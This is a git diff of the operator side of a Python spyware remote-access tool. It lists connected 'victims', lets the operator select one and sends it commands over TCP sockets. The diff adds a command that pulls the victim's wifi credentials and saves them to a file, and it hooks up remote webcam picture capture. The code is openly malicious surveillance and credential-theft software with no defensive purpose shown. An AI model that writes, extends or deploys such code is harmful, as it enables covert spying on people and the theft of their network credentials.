@@ -1,12 +1,11 @@
 import socket
 import threading
 import time
-
 from colorama import Fore, Back, Style
 
-from database import *
 # Local imports
-from other_func import *
+from handle_db import *
+from spyware_module import *
 
 HOST = ''
 CMD_PORT = 55555
@@ -14,9 +13,6 @@ DATA_PORT = 44444
 
 # Todo: Make a file downloader (3)
 # Todo: Make an encryptor/decryptor (4)
-# Todo: Add webcam snap (2)
-# Todo: split program in multiple local imports (1)
-
 
 class ChooseToAttack(object):
     # selected_user, users_online[x] => [IP, PORT, CMD_CONN, DATA_CONN] * reference
@@ -84,27 +80,27 @@ class ChooseToAttack(object):
                 clear_screen()
 
                 if self.printing_anim:
-
                     for line in ascii_logo:
                         if '\n' in line:
                             time.sleep(0.1)
                             print(line, end='')
                         else:
                             print(f'{Fore.GREEN}{line}{Style.RESET_ALL}' , end='')
-
                     self.printing_anim = False
                 else:
                     print(f'{Fore.GREEN}{ascii_logo}{Style.RESET_ALL}', end='')
 
+                raw_desc = ' - Type the name of the victim you want to select!'
                 rename_desc = f" - Type '{Fore.YELLOW}rename{Style.RESET_ALL}' to rename a victim!"
                 select_desc = f" - Type the {Fore.YELLOW}name{Style.RESET_ALL} of the victim you want to select!"
 
-                print(beautify(rename_desc, '=', 'top', len(select_desc)))
-                print(beautify(select_desc, '=', 'bottom'), end='\n\n')
+                print('=' * len(raw_desc))
+                print(rename_desc)
+                print(select_desc)
+                print('=' * len(raw_desc), end='\n\n')
 
                 for victim in self.users_online:
                     print(f" [+] {Back.BLUE}{victim}{Style.RESET_ALL} [+] connected on \"{Fore.BLUE}{self.users_online[victim][0]}\"{Style.RESET_ALL}")
-
                 self.printing_done = True
 
             elif self.input_thread:
@@ -116,7 +112,6 @@ class ChooseToAttack(object):
 
     def get_input(self):
         while self.switch:
-
             if self.printing_done:
                 user_input = input('\n >>> ')
                 self.printing_done = False
@@ -138,7 +133,6 @@ class ChooseToAttack(object):
                         else:
                             print(f'\n ERROR: username [{name}] already exists!')
                             input(' Press ENTER to continue > ')
-
                         self.refresh_sc = True
                     else:
                         print(f'\n ERROR: user [{name}] does not exist!')
@@ -148,7 +142,6 @@ class ChooseToAttack(object):
                     if user_input != '':
                         print(f"\n Error: No user found named [{user_input}]")
                         input(' Press ENTER to continue > ')
-
                     self.refresh_sc = True
 
 
@@ -159,30 +152,43 @@ class ExecuteCMD(object):
         self.refresh_sc = True
         self.printing_done = False
         self.offline = False
+        self.buffer = 1024
         self.victim_data = victim_data
+        self.printing_anim = True
         self.real_name = list(self.victim_data.keys())[0]
         self.cmd_conn = self.victim_data[self.real_name][2]
         self.data_conn = self.victim_data[self.real_name][3]
 
         self.run_cmd = {
             'Take picture': ['Take (x) pictures every (y) seconds', self.take_pictures],
-            'Back': ['Go back to victim selection', self.back]}
+            'Back': ['Go back to victim selection', self.back],
+            'Wifi': ['Get victims wifi credentials', self.get_wifi]}
 
     def pick_command(self):
         while self.switch:
-
             if self.refresh_sc:
                 self.refresh_sc = False
                 clear_screen()
 
-                print(f'{Fore.YELLOW}{ascii_cmd}{Style.RESET_ALL}')
-                print(f' Type the name of the command you want to use on [{Back.BLUE}{self.real_name}{Style.RESET_ALL}]\n')
-                print(beautify(f" {Fore.GREEN}command{Style.RESET_ALL}/{Fore.BLUE}description{Style.RESET_ALL}", '~'))
-                print('\n', end='')
+                if self.printing_anim:
+                    for line in ascii_cmd:
+                        if '\n' in line:
+                            time.sleep(0.1)
+                            print(line, end='')
+                        else:
+                            print(f'{Fore.YELLOW}{line}{Style.RESET_ALL}', end='')
+                    self.printing_anim = False
+                else:
+                    print(f'{Fore.YELLOW}{ascii_cmd}{Style.RESET_ALL}')
+
+                raw_txt = ' Type the name of the command you want to use on'
+                text = f'{raw_txt} [{Back.BLUE}{self.real_name}{Style.RESET_ALL}]'
+                print('~' * (len(raw_txt) + len(self.real_name) + 3))
+                print(text)
+                print('~' * (len(raw_txt) + len(self.real_name) + 3), end='\n\n')
 
                 for cmd in self.run_cmd:
-                    print(f" {cmd} <{Fore.GREEN}cmd{Style.RESET_ALL}--{Fore.BLUE}desc{Style.RESET_ALL}> {self.run_cmd[cmd][0]}")
-
+                    print(f" {Fore.YELLOW}{cmd}{Style.RESET_ALL} / {self.run_cmd[cmd][0]}")
                 self.printing_done = True
 
                 if self.input_thread:
@@ -197,7 +203,7 @@ class ExecuteCMD(object):
                 self.printing_done = False
 
                 if self.offline:
-                    print(f" [{self.real_name}] is offline!")
+                    print(f" [{self.real_name}] is {Fore.RED}OFFLINE{Style.RESET_ALL}!")
                     input(' Press ENTER to go back to victim selection! > ')
                     self.switch = False
                     self.refresh_sc = True
@@ -208,16 +214,21 @@ class ExecuteCMD(object):
 
                     if output == 'back':
                         self.switch = False
-                        break
 
                     elif output == 'take picture':
                         self.take_pictures()
-
                 self.refresh_sc = True
 
     def take_pictures(self):
         self.cmd_conn.send('take picture'.encode('utf-8'))
-        # print(data_downloader(self.data_conn))
+        img_downloader(self.data_conn)
+
+    def get_wifi(self):
+        self.cmd_conn.send('get wifi'.encode('utf-8'))
+        wifi_data = self.data_conn.recv(self.buffer).decode('utf-8')
+        file = open('wifi.txt', 'w')
+        file.write(wifi_data)
+        file.close()
 
     def back(self):
         self.switch = False
@@ -232,7 +243,6 @@ class ExecuteCMD(object):
 
 
 if __name__ == '__main__':
-
     cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cmd_sock.bind((HOST, CMD_PORT))
